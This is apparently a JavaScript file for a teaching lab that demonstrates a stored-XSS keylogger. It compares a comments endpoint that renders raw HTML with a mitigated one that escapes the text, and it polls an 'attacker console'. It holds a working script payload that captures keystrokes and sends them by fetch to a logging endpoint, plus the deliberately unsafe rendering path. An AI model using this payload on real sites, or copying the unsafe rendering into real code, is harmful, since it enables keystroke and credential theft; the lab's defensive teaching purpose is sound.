// Application Logic - XSS Keylogger Lab Demo

let activeMode = 'vulnerable'; // 'vulnerable' | 'mitigated'

document.addEventListener('DOMContentLoaded', () => {
    initTabs();
    initForms();
    loadComments();
    startKeyloggerPolling();
});

// Cambiar entre Pestañas (Vulnerable vs Mitigado)
function initTabs() {
    const btnVulnerable = document.getElementById('btn-tab-vulnerable');
    const btnMitigated = document.getElementById('btn-tab-mitigated');

    btnVulnerable.addEventListener('click', () => setMode('vulnerable'));
    btnMitigated.addEventListener('click', () => setMode('mitigated'));
}

function setMode(mode) {
    activeMode = mode;
    const btnVulnerable = document.getElementById('btn-tab-vulnerable');
    const btnMitigated = document.getElementById('btn-tab-mitigated');
    const modeBadge = document.getElementById('active-mode-badge');
    const endpointLabel = document.getElementById('active-endpoint-label');

    if (mode === 'vulnerable') {
        btnVulnerable.className = 'tab-btn active vulnerable';
        btnMitigated.className = 'tab-btn';
        modeBadge.className = 'badge vulnerable';
        modeBadge.textContent = 'ENDPOINT VULNERABLE';
        endpointLabel.textContent = '/api/vulnerable/comments';
    } else {
        btnVulnerable.className = 'tab-btn';
        btnMitigated.className = 'tab-btn active mitigated';
        modeBadge.className = 'badge mitigated';
        modeBadge.textContent = 'ENDPOINT MITIGADO';
        endpointLabel.textContent = '/api/mitigated/comments';
    }

    loadComments();
}

// Inicializar Formularios y Botones
function initForms() {
    const form = document.getElementById('comment-form');
    const btnInject = document.getElementById('btn-inject-payload');
    const btnClearLogs = document.getElementById('btn-clear-logs');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        await submitComment();
    });

    btnInject.addEventListener('click', () => {
        const payloadInput = document.getElementById('content-input');
        payloadInput.value = `<script>
document.addEventListener('keydown', function(e) {
    fetch('/api/keylogger/log?key=' + encodeURIComponent(e.key));
});
<\/script>
<p style="color:#ff3b5c; font-weight:bold;">⚠️ ¡Ataque Keylogger Inyectado mediante XSS!</p>`;
    });

    btnClearLogs.addEventListener('click', async () => {
        await fetch('/api/keylogger/logs', { method: 'DELETE' });
        document.getElementById('captured-keys-container').innerHTML = '<span style="color:#666;">Consola limpia. Escribe en el campo de prueba para verificar captura...</span>';
        loadComments();
    });
}

// Enviar Comentario al Backend
async function submitComment() {
    const authorInput = document.getElementById('author-input');
    const contentInput = document.getElementById('content-input');

    const author = authorInput.value.trim() || 'Usuario Anónimo';
    const content = contentInput.value.trim();

    if (!content) return;

    const endpoint = activeMode === 'vulnerable' ? '/api/vulnerable/comments' : '/api/mitigated/comments';

    try {
        const response = await fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ author, content })
        });

        if (response.ok) {
            contentInput.value = '';
            await loadComments();
        } else {
            alert('Error al publicar comentario');
        }
    } catch (err) {
        console.error('Error de conexión:', err);
    }
}

// Cargar y Renderizar Comentarios
async function loadComments() {
    const commentContainer = document.getElementById('comment-list');
    const endpoint = activeMode === 'vulnerable' ? '/api/vulnerable/comments' : '/api/mitigated/comments';

    try {
        const response = await fetch(endpoint);
        const comments = await response.json();

        commentContainer.innerHTML = '';

        if (comments.length === 0) {
            commentContainer.innerHTML = '<div style="color:var(--text-muted); text-align:center; padding:1rem;">No hay comentarios registrados.</div>';
            return;
        }

        comments.forEach(comment => {
            const card = document.createElement('div');
            card.className = 'comment-card';

            const header = document.createElement('div');
            header.className = 'comment-header';
            header.innerHTML = `<span class="comment-author">${escapeHtml(comment.author)}</span> <span>${new Date(comment.createdAt || Date.now()).toLocaleTimeString()}</span>`;

            const body = document.createElement('div');
            body.className = 'comment-body';

            if (activeMode === 'vulnerable') {
                // VULNERABLE: Se renderiza como HTML crudo. Si contiene <script>, se ejecuta contextualmente.
                const range = document.createRange();
                const fragment = range.createContextualFragment(comment.content);
                body.appendChild(fragment);
            } else {
                // MITIGADO: Se muestra como texto o código escapado de forma segura.
                body.textContent = comment.content;
            }

            card.appendChild(header);
            card.appendChild(body);
            commentContainer.appendChild(card);
        });
    } catch (err) {
        console.error('Error al cargar comentarios:', err);
    }
}

// Utilidad local para escapar encabezados del autor
function escapeHtml(text) {
    if (!text) return '';
    return text.replace(/&/g, "&amp;")
               .replace(/</g, "&lt;")
               .replace(/>/g, "&gt;")
               .replace(/"/g, "&quot;")
               .replace(/'/g, "&#039;");
}

// Polling continuo para actualizar la Consola del Atacante en tiempo real
function startKeyloggerPolling() {
    setInterval(async () => {
        try {
            const res = await fetch('/api/keylogger/logs');
            if (res.ok) {
                const logs = await res.json();
                renderAttackerConsole(logs);
            }
        } catch (e) {
            // Ignorar errores de red temporales
        }
    }, 1000);
}

function renderAttackerConsole(logs) {
    const container = document.getElementById('captured-keys-container');
    if (!logs || logs.length === 0) {
        container.innerHTML = '<span style="color:#666;">[C2 Server Inactivo] No se han interceptado pulsaciones de teclado aún.</span>';
        return;
    }

    container.innerHTML = '';
    const keyStream = document.createElement('div');
    keyStream.className = 'key-stream';

    logs.forEach(log => {
        const badge = document.createElement('span');
        badge.className = 'key-badge';
        badge.textContent = log.key === ' ' ? 'Space' : log.key;
        keyStream.appendChild(badge);
    });

    container.appendChild(keyStream);
}
